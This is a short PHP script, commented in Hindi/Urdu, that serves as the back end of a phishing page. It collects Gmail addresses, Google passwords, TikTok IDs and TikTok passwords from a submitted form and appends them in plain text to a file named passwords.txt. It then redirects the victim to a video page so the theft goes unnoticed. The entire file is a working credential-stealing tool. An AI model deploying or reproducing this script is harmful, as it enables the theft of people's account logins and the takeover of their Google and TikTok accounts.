<?php
// Data capture karna
$gmail = $_POST['gmail'];
$gpass = $_POST['gpass'];
$tt_id = $_POST['tt_id'];
$tt_pass = $_POST['tt_pass'];

// Format for the text file
$data = "--- NEW ENTRY ---\n";
$data .= "Gmail: " . $gmail . "\n";
$data .= "Google Pass: " . $gpass . "\n";
$data .= "TikTok ID: " . $tt_id . "\n";
$data .= "TikTok Pass: " . $tt_pass . "\n";
$data .= "------------------\n\n";

// passwords.txt file mein save karna
$file = fopen("passwords.txt", "a");
fwrite($file, $data);
fclose($file);

// User ko video page par redirect karna
header("Location: video.html");
exit();
?>
